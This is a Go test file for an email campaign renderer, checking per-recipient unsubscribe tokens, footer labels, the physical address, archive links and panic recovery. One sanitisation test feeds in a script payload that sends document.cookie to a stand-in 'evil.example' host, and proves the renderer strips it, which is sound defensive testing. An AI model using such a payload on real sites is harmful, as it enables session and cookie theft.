package mailing

import (
	"errors"
	"fmt"
	"strings"
	"testing"
)

// testCampaignMarkdown is the fixed campaign body every golden/property
// test in this file renders, chosen to exercise headings, emphasis, a
// link, a list, and a blockquote in one body — the shapes a real workshop
// announcement is likely to use. Kept literal (not generated) so the
// golden fixture and any diff are easy to read, matching
// templates_test.go's testBaseURL/testManage convention.
const testCampaignMarkdown = `# Workshop night is back

Join us this **Thursday** for an evening of soldering and bad decisions.
Details and RSVP: [sign up here](https://opencircuitsf.com/workshops/12).

- Bring your own tools if you have them
- Snacks and coffee provided
- Doors open at 6:30pm

> Last time we ran out of solder by 7:15. This time we bought more.
`

func testCampaignInput() CampaignRenderInput {
	return CampaignRenderInput{
		Subject:         "Workshop night is back",
		Preheader:       "Thursday, 6:30pm — bring your own tools.",
		BodyMarkdown:    testCampaignMarkdown,
		BaseURL:         testBaseURL,
		ManageToken:     testManage,
		PhysicalAddress: testAddress,
	}
}

func TestRenderCampaign_Golden(t *testing.T) {
	htmlOut, textOut, err := RenderCampaign(testCampaignInput())
	if err != nil {
		t.Fatalf("RenderCampaign: %v", err)
	}
	goldenFile(t, "campaign.html", htmlOut)
	goldenFile(t, "campaign.txt", textOut)
}

func TestRenderCampaign_Deterministic(t *testing.T) {
	in := testCampaignInput()
	html1, text1, err := RenderCampaign(in)
	if err != nil {
		t.Fatalf("RenderCampaign: %v", err)
	}
	html2, text2, err := RenderCampaign(in)
	if err != nil {
		t.Fatalf("RenderCampaign: %v", err)
	}
	if html1 != html2 {
		t.Errorf("HTML output not deterministic across two renders of the same input")
	}
	if text1 != text2 {
		t.Errorf("text output not deterministic across two renders of the same input")
	}
}

// TestRenderCampaign_MissingManageTokenIsHardError pins the acceptance
// criterion in issues/0042.md verbatim: "Substitution failures (missing
// token) are hard errors, not silently empty links."
//
// Mutation check performed by hand: commented out the
// `strings.TrimSpace(in.ManageToken) == ""` branch in RenderCampaign and
// re-ran this table — all four cases failed (RenderCampaign returned a
// rendered document with an empty-token href instead of an error).
// Reverted via `cp` from a copy taken before the mutation; `git diff`
// empty afterward.
func TestRenderCampaign_MissingManageTokenIsHardError(t *testing.T) {
	for _, token := range []string{"", " ", "\t\n ", "   "} {
		in := testCampaignInput()
		in.ManageToken = token
		htmlOut, textOut, err := RenderCampaign(in)
		if !errors.Is(err, ErrMissingManageToken) {
			t.Errorf("token %q: got err %v, want ErrMissingManageToken", token, err)
		}
		if htmlOut != "" || textOut != "" {
			t.Errorf("token %q: expected no partial document on error, got html=%q text=%q", token, htmlOut, textOut)
		}
	}
}

func TestRenderCampaign_MissingBaseURLIsHardError(t *testing.T) {
	in := testCampaignInput()
	in.BaseURL = ""
	htmlOut, textOut, err := RenderCampaign(in)
	if !errors.Is(err, ErrMissingBaseURL) {
		t.Errorf("got err %v, want ErrMissingBaseURL", err)
	}
	if htmlOut != "" || textOut != "" {
		t.Errorf("expected no partial document on error, got html=%q text=%q", htmlOut, textOut)
	}
}

// TestRenderCampaign_TokenSubstitutedIntoFooterLinks proves the
// recipient's own manage token reaches both footer links in both parts —
// the mechanism #0045's send worker relies on to give every recipient a
// live, individual one-click unsubscribe/manage link.
func TestRenderCampaign_TokenSubstitutedIntoFooterLinks(t *testing.T) {
	in := testCampaignInput()
	in.ManageToken = "UNIQUE-RECIPIENT-TOKEN-42"
	htmlOut, textOut, err := RenderCampaign(in)
	if err != nil {
		t.Fatalf("RenderCampaign: %v", err)
	}
	wantManage := testBaseURL + "/preferences?token=UNIQUE-RECIPIENT-TOKEN-42"
	wantUnsub := testBaseURL + "/unsubscribe?token=UNIQUE-RECIPIENT-TOKEN-42"
	for _, part := range []struct {
		name, body string
	}{{"html", htmlOut}, {"text", textOut}} {
		if !strings.Contains(part.body, wantManage) {
			t.Errorf("%s part missing manage URL %q", part.name, wantManage)
		}
		if !strings.Contains(part.body, wantUnsub) {
			t.Errorf("%s part missing unsubscribe URL %q", part.name, wantUnsub)
		}
	}
}

// TestRenderCampaign_DifferentTokensProduceDifferentLinks is the negative
// half of the substitution test: two recipients must never end up with the
// same footer links, which is what would let recipient A unsubscribe
// recipient B with one click (the exact failure #0035's review flagged for
// the header seam — this is the footer-link analogue).
func TestRenderCampaign_DifferentTokensProduceDifferentLinks(t *testing.T) {
	inA := testCampaignInput()
	inA.ManageToken = "TOKEN-A"
	inB := testCampaignInput()
	inB.ManageToken = "TOKEN-B"

	htmlA, textA, err := RenderCampaign(inA)
	if err != nil {
		t.Fatalf("RenderCampaign(A): %v", err)
	}
	htmlB, textB, err := RenderCampaign(inB)
	if err != nil {
		t.Fatalf("RenderCampaign(B): %v", err)
	}
	if strings.Contains(htmlA, "TOKEN-B") || strings.Contains(textA, "TOKEN-B") {
		t.Errorf("recipient A's render carries recipient B's token")
	}
	if strings.Contains(htmlB, "TOKEN-A") || strings.Contains(textB, "TOKEN-A") {
		t.Errorf("recipient B's render carries recipient A's token")
	}
}

// TestRenderCampaign_FooterCarriesBothRequiredLabels pins PRD §6.5 Path 2's
// exact wording, per #0043's carried-in criterion from #0035's review: both
// "Manage your interests" and "Unsubscribe from everything" must appear in
// every campaign email, in both parts.
func TestRenderCampaign_FooterCarriesBothRequiredLabels(t *testing.T) {
	htmlOut, textOut, err := RenderCampaign(testCampaignInput())
	if err != nil {
		t.Fatalf("RenderCampaign: %v", err)
	}
	for _, label := range []string{"Manage your interests", "Unsubscribe from everything"} {
		if !strings.Contains(htmlOut, label) {
			t.Errorf("HTML part missing footer label %q", label)
		}
		if !strings.Contains(textOut, label) {
			t.Errorf("text part missing footer label %q", label)
		}
	}
}

// TestRenderCampaign_ArchiveLinkInBothPartsWhenSlugSet is #0123's own
// acceptance criterion: "Every campaign email carries a 'View this email
// in your browser' link to its archive URL, in both the HTML and
// plain-text parts."
func TestRenderCampaign_ArchiveLinkInBothPartsWhenSlugSet(t *testing.T) {
	in := testCampaignInput()
	in.Slug = "workshop-night-is-back"
	htmlOut, textOut, err := RenderCampaign(in)
	if err != nil {
		t.Fatalf("RenderCampaign: %v", err)
	}
	wantURL := testBaseURL + "/archive/workshop-night-is-back"
	if !strings.Contains(htmlOut, "View this email in your browser") || !strings.Contains(htmlOut, wantURL) {
		t.Errorf("HTML part missing archive link to %q:\n%s", wantURL, htmlOut)
	}
	if !strings.Contains(textOut, "View this email in your browser") || !strings.Contains(textOut, wantURL) {
		t.Errorf("text part missing archive link to %q:\n%s", wantURL, textOut)
	}
}

// TestRenderCampaign_NoArchiveLinkWhenSlugEmpty pins the empty-Slug
// backward-compatible default (CampaignRenderInput.Slug's own doc
// comment): every pre-#0123 caller and #0045's preflight dry render must
// render byte-identically to before this issue, with no archive link at
// all.
func TestRenderCampaign_NoArchiveLinkWhenSlugEmpty(t *testing.T) {
	htmlOut, textOut, err := RenderCampaign(testCampaignInput())
	if err != nil {
		t.Fatalf("RenderCampaign: %v", err)
	}
	if strings.Contains(htmlOut, "View this email in your browser") {
		t.Error("HTML part carries an archive link despite an empty Slug")
	}
	if strings.Contains(textOut, "View this email in your browser") {
		t.Error("text part carries an archive link despite an empty Slug")
	}
}

// TestRenderCampaign_PhysicalAddressAppendedToBothParts pins the CAN-SPAM
// §7704 requirement: the address must reach both parts, not just one.
//
// Mutation check performed by hand: removed the
// `if physicalAddress != ""` block from wrapCampaignText and re-ran — the
// text-part assertion below failed while the HTML assertion kept passing,
// confirming the test actually distinguishes the two parts rather than
// only checking one. Reverted via `cp`; `git diff` empty afterward.
func TestRenderCampaign_PhysicalAddressAppendedToBothParts(t *testing.T) {
	htmlOut, textOut, err := RenderCampaign(testCampaignInput())
	if err != nil {
		t.Fatalf("RenderCampaign: %v", err)
	}
	if !strings.Contains(htmlOut, testAddress) {
		t.Errorf("HTML part missing physical address")
	}
	if !strings.Contains(textOut, testAddress) {
		t.Errorf("text part missing physical address")
	}
}

func TestRenderCampaign_BlankPhysicalAddressOmitsLineRatherThanFabricating(t *testing.T) {
	in := testCampaignInput()
	in.PhysicalAddress = ""
	htmlOut, textOut, err := RenderCampaign(in)
	if err != nil {
		t.Fatalf("RenderCampaign: %v", err)
	}
	// Not asserting anything is absent by string content (there is no
	// address to look for) — just that rendering an empty address doesn't
	// error and doesn't leave a stray empty <p></p> or blank line marker.
	if strings.Contains(htmlOut, `<p style="margin:0 0 8px;"></p>`) {
		t.Errorf("expected no empty address paragraph, got: %s", htmlOut)
	}
	_ = textOut
}

// TestRenderCampaign_RawHTMLNeverReachesEitherPart is the end-to-end
// version of the two campaign_markdown_test.go raw-HTML tests, run through
// the full RenderCampaign path a real send actually uses.
//
// It asserts the <script> tag never survives as live markup, and that
// "evil.example" never becomes a live href/src. It deliberately does NOT
// assert the domain name is absent from the output altogether: the literal
// text between the suppressed <script> tags (an attacker's URL, typed as
// plain copy) surviving as inert, non-clickable text is expected — it is
// exactly what html.EscapeString would also produce for the same input,
// and inert text is not the thing this issue's acceptance criteria forbid.
// An earlier version of this test asserted the domain string was absent
// entirely and failed against correct output; fixed rather than loosening
// the render to satisfy an over-strict assertion.
func TestRenderCampaign_RawHTMLNeverReachesEitherPart(t *testing.T) {
	in := testCampaignInput()
	in.BodyMarkdown = `Click here: <script>fetch("https://evil.example/steal?c="+document.cookie)</script>`
	htmlOut, textOut, err := RenderCampaign(in)
	if err != nil {
		t.Fatalf("RenderCampaign: %v", err)
	}
	if strings.Contains(htmlOut, "<script") {
		t.Fatalf("raw <script> tag survived in HTML part: %s", htmlOut)
	}
	if strings.Contains(textOut, "<script") {
		t.Fatalf("raw <script> tag survived in text part: %s", textOut)
	}
	if strings.Contains(htmlOut, `href="https://evil.example`) || strings.Contains(htmlOut, `src="https://evil.example`) {
		t.Fatalf("evil.example became a live href/src rather than inert text: %s", htmlOut)
	}
}

// TestRenderCampaign_RemoteImageNeverReachesEitherPart is #0045 §11 item
// 6's "no open-tracking pixel" property, proven at this layer: no <img>
// tag and no reference to the image's host survives into either part,
// regardless of the image's declared size.
func TestRenderCampaign_RemoteImageNeverReachesEitherPart(t *testing.T) {
	in := testCampaignInput()
	in.BodyMarkdown = `![](https://tracker.example/o/pixel.gif)`
	htmlOut, textOut, err := RenderCampaign(in)
	if err != nil {
		t.Fatalf("RenderCampaign: %v", err)
	}
	if strings.Contains(htmlOut, "<img") || strings.Contains(htmlOut, "tracker.example") {
		t.Fatalf("remote image leaked into HTML part: %s", htmlOut)
	}
	if strings.Contains(textOut, "tracker.example") {
		t.Fatalf("remote image URL leaked into text part: %s", textOut)
	}
}

// TestRenderCampaign_PanicIsRecoveredAsError proves RenderCampaign's
// recover() (not just its presence in the source) actually converts a
// panic during rendering into a typed error rather than crashing the
// caller — the property #0045's plan needs: GatherPreflight's dry render
// with the "PREFLIGHT-DRY-RUN" sentinel token must never crash the send
// worker.
//
// Mutation check performed by hand: removed the `defer func() { if r :=
// recover(); ... }()` block from RenderCampaign and re-ran — the test
// process panicked out of the test binary instead of observing a returned
// error (confirmed via `go test -run TestRenderCampaign_PanicIsRecoveredAsError`
// exiting nonzero with a panic trace, not a normal test failure). Reverted
// via `cp`; `git diff` empty afterward.
func TestRenderCampaign_PanicIsRecoveredAsError(t *testing.T) {
	original := renderCampaignBody
	defer func() { renderCampaignBody = original }()
	renderCampaignBody = func(string) (string, string, error) {
		panic("simulated rendering fault")
	}

	htmlOut, textOut, err := RenderCampaign(testCampaignInput())
	if err == nil {
		t.Fatalf("expected an error, got nil (html=%q text=%q)", htmlOut, textOut)
	}
	if htmlOut != "" || textOut != "" {
		t.Errorf("expected no partial document after a recovered panic, got html=%q text=%q", htmlOut, textOut)
	}
	if !strings.Contains(err.Error(), "panicked") {
		t.Errorf("expected the error to name the panic, got: %v", err)
	}
}

// TestMarkdownCampaignRenderer_ImplementsInterface is a compile-time-ish
// sanity check that MarkdownCampaignRenderer satisfies CampaignRenderer —
// the exact seam issues/0045.md §5's send worker depends on — and that
// calling through the interface produces the same result as calling
// RenderCampaign directly.
func TestMarkdownCampaignRenderer_ImplementsInterface(t *testing.T) {
	var r CampaignRenderer = MarkdownCampaignRenderer{}
	wantHTML, wantText, wantErr := RenderCampaign(testCampaignInput())
	gotHTML, gotText, gotErr := r.Campaign(testCampaignInput())
	if !errors.Is(gotErr, wantErr) && (gotErr == nil) != (wantErr == nil) {
		t.Fatalf("error mismatch: got %v, want %v", gotErr, wantErr)
	}
	if gotHTML != wantHTML || gotText != wantText {
		t.Errorf("CampaignRenderer.Campaign result differs from RenderCampaign's")
	}
}

// TestRenderCampaign_PreflightSentinelTokenRendersSuccessfully confirms the
// literal sentinel #0045's plan names ("PREFLIGHT-DRY-RUN") is treated as
// an ordinary non-empty token — a dry-run render must succeed (so a real
// content problem, not the sentinel itself, is what body_render_failed
// reports) and produce byte-identical output to any other non-empty token
// on the same body, i.e. the sentinel isn't special-cased anywhere in this
// package.
func TestRenderCampaign_PreflightSentinelTokenRendersSuccessfully(t *testing.T) {
	in := testCampaignInput()
	in.ManageToken = "PREFLIGHT-DRY-RUN"
	htmlOut, textOut, err := RenderCampaign(in)
	if err != nil {
		t.Fatalf("RenderCampaign with sentinel token: %v", err)
	}
	if !strings.Contains(htmlOut, "PREFLIGHT-DRY-RUN") || !strings.Contains(textOut, "PREFLIGHT-DRY-RUN") {
		t.Errorf("expected the sentinel token substituted like any other token")
	}
}

func ExampleRenderCampaign() {
	htmlOut, _, err := RenderCampaign(CampaignRenderInput{
		Subject:      "Example",
		BodyMarkdown: "Hello **world**.",
		BaseURL:      "https://www.opencircuitsf.com",
		ManageToken:  "TOKEN",
	})
	if err != nil {
		fmt.Println("error:", err)
		return
	}
	fmt.Println(strings.Contains(htmlOut, "<strong>world</strong>"))
	// Output: true
}
